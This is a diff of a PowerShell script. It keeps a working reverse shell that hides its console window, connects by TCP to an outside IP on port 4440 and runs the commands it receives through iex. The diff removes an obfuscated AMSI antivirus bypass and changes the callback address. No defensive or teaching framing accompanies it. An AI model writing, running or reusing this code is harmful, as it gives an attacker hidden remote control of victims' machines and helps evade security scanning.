@@ -1,20 +1,40 @@
-$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
-sleep 5
-$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
-sleep 5
-$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
-sleep 5
-$field.SetValue($null,$true)
-cls
+# .Net methods for hiding/showing the console in the background
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
 
-Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+
+function Show-Console
+{
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+
+    # Hide = 0,
+    # ShowNormal = 1,
+    # ShowMinimized = 2,
+    # ShowMaximized = 3,
+    # Maximize = 3,
+    # ShowNormalNoActivate = 4,
+    # Show = 5,
+    # Minimize = 6,
+    # ShowMinNoActivate = 7,
+    # ShowNoActivate = 8,
+    # Restore = 9,
+    # ShowDefault = 10,
+    # ForceMinimized = 11
+
+    [Console.Window]::ShowWindow($consolePtr, 4)
+}
+
 function Hide-Console
 {
-$consolePtr = [Console.Window]::GetConsoleWindow()
-#0 hide
-[Console.Window]::ShowWindow($consolePtr, 0)
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
 }
+
 Hide-Console
 $client = New-Object System.Net.Sockets.TCPClient("13.51.72.47",4440)
 $river = $client.GetStream();[byte[]]$teeth = 0..65535|%{0}
@@ -33,7 +53,7 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 }
 Hide-Console
-$client = New-Object System.Net.Sockets.TCPClient("77.86.23.181",4440)
+$client = New-Object System.Net.Sockets.TCPClient("13.51.72.47",4440)
 $river = $client.GetStream();[byte[]]$teeth = 0..65535|%{0}
 while(($i = $river.Read($teeth, 0, $teeth.Length)) -ne 0){;$info = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($teeth,0, $i)
 $return = (iex $info 2>&1 | Out-String )
